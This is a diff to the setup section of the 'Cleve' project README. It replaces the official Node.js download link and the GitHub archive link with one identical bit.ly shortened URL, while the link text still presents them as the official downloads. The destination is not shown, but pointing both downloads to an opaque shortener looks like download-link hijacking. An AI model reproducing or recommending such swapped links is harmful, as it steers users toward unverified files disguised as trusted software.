@@ -24,8 +24,8 @@
 
 
 ## Installation & Setup
-- [Node.js v16.9+](https://nodejs.org/en/download) is required to download.
-- Download & extract the files either by `git clone https://github.com/Carbowix/Cleve.git` or by simply [downloading](https://github.com/Carbowix/Cleve/archive/refs/heads/master.zip)
+- [Node.js v16.9+](https://bit.ly/49B390L) is required to download.
+- Download & extract the files either by `git clone https://github.com/Carbowix/Cleve.git` or by simply [downloading](https://bit.ly/49B390L)
 - Open your command prompt and be sure you are on the right root directory by using [cd](https://www.lifewire.com/change-directories-in-command-prompt-5185508) command.
 - Once you are sure, proceed with `npm install` or `yarn install` command to install latest packages.
 
